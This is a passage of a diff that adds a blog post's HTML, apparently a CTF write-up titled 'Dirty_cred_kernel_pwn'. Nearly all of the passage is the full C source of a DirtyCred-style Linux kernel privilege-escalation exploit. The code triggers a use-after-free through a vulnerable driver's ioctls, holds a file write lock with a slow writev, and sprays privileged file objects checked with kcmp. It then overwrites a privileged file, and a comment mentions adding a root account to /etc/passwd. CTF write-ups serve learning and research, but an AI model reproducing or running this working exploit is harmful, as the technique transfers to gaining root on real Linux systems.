+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">clone</span><span class="p">(</span><span class="n">namespace_sandbox_proc</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sandbox_stack</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">sandbox_stack</span><span class="p">)</span> <span class="o">-</span> <span class="mi">64</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">              <span class="n">CLONE_NEWUSER</span> <span class="o">|</span> <span class="n">CLONE_NEWPID</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret_status</span> <span class="o">=</span> <span class="nf">wait_for_loop</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] succeed</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] checking /happy</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] executing command : head -n 5 /happy</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">system</span><span class="p">(</span><span class="s">&#34;head -n 5 /happy&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] failed to write, retry...</span><span class="se">\n\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ===========================
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifndef __NR_fsconfig
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __NR_fsconfig 431
+</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp">#ifndef __NR_fsopen
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define __NR_fsopen 430
+</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define MAX_FILE_NUM 1000
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">uaf_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">fds</span><span class="p">[</span><span class="n">MAX_FILE_NUM</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">run_write</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// make thread 1 get lock first, then thread 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">run_spray</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// make thread 2 allocate unprivileged object first, then thread 3
+</span></span></span><span class="line"><span class="cl"><span class="c1">// slow_write() —— thread 1: occupy the write lock, and write plenty of data
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">slow_write</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] start slow write to get the lock %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./uaf&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;error open uaf file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x30000000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="mh">0x80000</span><span class="p">;</span> <span class="n">offset</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">r</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                   <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;allocate failed at 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span><span class="p">(</span><span class="n">offset</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="s">&#34;hhhhh&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// send 5 write address to trigger writev (vector write), that can be blocked
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">mem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iov</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="p">(</span><span class="n">offset</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x1000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">run_write</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>    <span class="c1">// thread 2 can begin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">iov</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;slow write&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] write done!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// write_cmd() —— thread 2: write evil data to the privileged file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">write_cmd</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;/flag</span><span class="se">\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>     <span class="c1">// hacker❌0:0:root:/:/bin/sh    \nDirtyCred works!\n\n   
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">iov</span> <span class="o">=</span> <span class="p">{.</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="p">.</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">8</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">run_write</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;run_wriet:%d:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">run_write</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">run_spray</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>   <span class="c1">// thread 3 can begin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">writev</span><span class="p">(</span><span class="n">uaf_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">iov</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;failed to write</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] overwrite done! It should be after the slow write</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// spray_files() —— thread 3: spray high privileged file object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">spray_files</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">run_spray</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;run_spray:%d:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">run_spray</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// spray priviledged file object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] got uaf fd %d, start spray....</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uaf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// getchar();
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/happy&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open file&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  <span class="c1">// kcmp - 确定两个已经打开的文件描述符（可能来自不同的进程）是否指向内核中的同一个已打开的文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// int kcmp(pid_t pid1, pid_t pid2, int type, unsigned long idx1, unsigned long idx2);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// 若为同一文件，则表示 file 对象已成功替换
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_kcmp</span><span class="p">,</span> <span class="nf">getpid</span><span class="p">(),</span> <span class="nf">getpid</span><span class="p">(),</span> <span class="n">KCMP_FILE</span><span class="p">,</span> <span class="n">uaf_fd</span><span class="p">,</span> <span class="n">fds</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] found, file id %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">close</span><span class="p">(</span><span class="n">fds</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// trigger() —— trigger UAF to free the unprivileged file object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">trigger</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//   int fs_fd = syscall(__NR_fsopen, &#34;cgroup&#34;, 0);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   if (fs_fd &lt; 0) {
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     perror(&#34;fsopen&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     die(&#34;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">symlink</span><span class="p">(</span><span class="s">&#34;./data&#34;</span><span class="p">,</span> <span class="s">&#34;./uaf&#34;</span><span class="p">);</span>   <span class="c1">// symbol link ./uaf -&gt; ./data, to avoid the lock in __fdget_pos() before permission check
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">//   uaf_fd = open(&#34;./uaf&#34;, 1);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   if (uaf_fd &lt; 0) 
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     die(&#34;failed to open symbolic file\n&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1">//   if (syscall(__NR_fsconfig, fs_fd, 5, &#34;source&#34;, 0, uaf_fd)) {      // FSCONFIG_SET_FD = 5
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     perror(&#34;fsconfig&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//     exit(-1);
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   }
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   // free the uaf fd
+</span></span></span><span class="line"><span class="cl"><span class="c1">//   close(fs_fd);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fs_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/fileManager&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fs_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uaf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./uaf&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">uaf_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="nf">die</span><span class="p">(</span><span class="s">&#34;failed to open symbolic file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fs_fd</span><span class="p">,</span><span class="mh">0x5555</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fs_fd</span><span class="p">,</span><span class="mh">0x6666</span><span class="p">,</span><span class="n">uaf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// loop() —— main exploit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">trigger</span><span class="p">();</span>                                        <span class="c1">// trigger UAF to free the unprivileged file object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">p_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_id</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">slow_write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>    <span class="c1">// thread 1: occupy the write lock 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="kt">pthread_t</span> <span class="n">p_id_cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p_id_cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">write_cmd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="c1">// thread 2: wait for the write lock to an unprivileged file 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">exit</span><span class="p">(</span><span class="nf">spray_files</span><span class="p">());</span>                              <span class="c1">// thread 3: spray high privileged file object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span> <span class="mh">0x1ffff000ul</span><span class="p">,</span> <span class="mh">0x1000ul</span><span class="p">,</span> <span class="mi">0ul</span><span class="p">,</span> <span class="mh">0x32ul</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0ul</span><span class="p">);</span>     <span class="c1">// void * mmap(void *start, size_t length, int prot , int flags, int fd, off_t offset)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span> <span class="mh">0x20000000ul</span><span class="p">,</span> <span class="mh">0x1000000ul</span><span class="p">,</span> <span class="mi">7ul</span><span class="p">,</span> <span class="mh">0x32ul</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0ul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span> <span class="mh">0x21000000ul</span><span class="p">,</span> <span class="mh">0x1000ul</span><span class="p">,</span> <span class="mi">0ul</span><span class="p">,</span> <span class="mh">0x32ul</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0ul</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">use_temporary_dir</span><span class="p">();</span>   <span class="c1">// setup workdir in ./exp_dir/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">do_sandbox_namespace</span><span class="p">();</span><span class="c1">// create sub-process to escalate privilege and check whether the &#34;/etc/passwd&#34; is changed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-26&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/bd97330cc0b5cdb711e24388ffdf2d41595c6e6d" target="_blank" title="commit by cnitlrt(1258175307@qq.com) bd97330cc0b5cdb711e24388ffdf2d41595c6e6d: blog">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>bd97330</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" data-title="Dirty_cred_kernel_pwn" data-hashtags="kernel"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" data-hashtag="kernel"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" data-title="Dirty_cred_kernel_pwn"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" data-title="Dirty_cred_kernel_pwn"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://cnitlrt.github.io/dirty_cred_kernel_pwn/" data-title="Dirty_cred_kernel_pwn"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kernel/">kernel</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/netlink/" class="prev" rel="prev" title="ACTF 2023 easy netlink"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ACTF 2023 easy netlink</a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">cnitlrt</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
